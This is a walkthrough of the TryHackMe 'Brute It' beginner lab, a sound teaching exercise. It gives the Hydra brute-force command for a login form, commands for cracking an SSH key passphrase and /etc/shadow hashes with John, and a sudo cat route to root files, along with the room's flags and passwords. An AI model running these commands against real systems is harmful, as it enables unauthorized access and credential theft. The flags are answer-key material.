BruteIt TRYHACKME Walkthrough

The Brute It room on TryHackMe is a beginner-level challenge where we practice brute-forcing credentials, cracking password hashes, and escalating privileges to gain full control of a target machine. Join the room here: https://tryhackme.com/room/bruteit

VPN Connection

Download the VPN configuration file from https://tryhackme.com/access
Navigate to the folder where the config file is saved
Connect to the VPN -> sudo openvpn "<name-of-config-file>.ovpn"

Task 1 — About this Box

Deploy the machine by clicking Start Machine in Task 1
Wait for the IP address of the target machine to appear

Task 2 — Reconnaissance

Scan the target machine for open ports and running services -> nmap -sC -sV -Pn -T4 <target_ip>
Open ports -> 22, 80
SSH version -> OpenSSH 7.6p1
Apache version -> 2.4.49
Linux distribution -> Ubuntu

Search for hidden directories on the web server -> /admin found

Task 3 — Getting a Shell

Brute-force admin panel credentials using Hydra -> hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form "/admin/:user=^USER^&pass=^PASS^:Invalid"
Admin credentials -> admin:xavier

Log in to the admin panel and download RSA private key -> wget http://<target_ip>/admin/panel/id_rsa

Crack the RSA private key passphrase -> ssh2john id_rsa > bruteit.txt
-> john --wordlist=/usr/share/wordlists/rockyou.txt bruteit.txt
-> chmod 700 id_rsa
RSA key passphrase -> rockinroll

SSH into the machine using the key and passphrase -> ssh -i id_rsa john@<target_ip>
Web flag -> THM{brut3_f0rce_is_e4sy}
User flag -> THM{a_password_is_not_a_barrier}

Task 4 — Privilege Escalation

Check sudo privileges: john can run /bin/cat as root without a password

Read root flag -> sudo /bin/cat /root/root.txt
Root flag -> THM{pr1v1l3g3_3sc4l4t10n}

Crack root password from /etc/shadow -> sudo /bin/cat /etc/shadow
-> john --wordlist=/usr/share/wordlists/rockyou.txt b.txt
Root password -> football

Summary

Gained initial access using brute force and password cracking
Escalated privileges to root using sudo permissions

Captured all flags: web, user, root

Emphasizes the power of password attacks and privilege escalation
